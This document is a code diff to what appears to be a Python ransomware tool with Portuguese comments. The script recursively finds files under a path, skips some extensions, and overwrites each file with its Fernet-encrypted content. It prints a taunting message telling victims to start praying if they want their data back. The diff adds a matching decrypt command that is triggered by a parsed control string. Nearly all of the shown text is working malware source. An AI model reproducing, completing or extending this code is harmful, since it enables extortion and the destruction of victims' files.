@@ -55,18 +55,24 @@ def discover(initial_path):
             if ext not in white_list:
                 yield abs_path
 
-def crypt_file(filename, key):
+def crypt_file(filename, key, action='encrypt'):
     '''
-    Criptografa o arquivo informado.
+    Criptografa/descriptografa o arquivo dependendo da ação informada.
 
     Parameters:
         filename (str): Nome do arquivo que será criptografado.
         key (str): Chave de criptografia.
+        action (str): Ação para criptografar ou descriptografar o arquivo.
     '''
     cipher_value = None
     with open(filename, 'rb') as _file:
         content = _file.read()
-        cipher_value = Fernet(key).encrypt(content)
+        if action == 'encrypt':
+            cipher_value = Fernet(key).encrypt(content)
+        elif action == 'decrypt':
+            cipher_value = Fernet(key).decrypt(content)
+        else:
+            return
 
     with open(filename, 'wb') as _file:
         _file.write(cipher_value)
@@ -156,8 +162,20 @@ if __name__ == "__main__":
                                 print('{}Começando a criptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
 
                                 for filename in discover(crypt_path):
-                                    crypt_file(filename, key)
+                                    crypt_file(filename, key, 'encrypt')
                                 print('{}Se quiser ver seus dados novamente, comece a rezar!{}'.format(cores['red'], cores['limpa']))
+
+
+
+                            # Descriptografa os arquivos do caminho especificado com a chave informada
+                            elif entry[3:8] == 'dcryp':
+                                path, key = entry[8:].split(':')
+                                crypt_path = os.path.abspath(os.path.join(os.getcwd(), path))
+                                print('{}Começando a descriptografar > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
+
+                                for filename in discover(crypt_path):
+                                    crypt_file(filename, key, 'decrypt')
+                                print('{}Arquivos descriptografados > {}{}{}'.format(cores['red'], cores['green'], crypt_path, cores['limpa']))
 
 
 
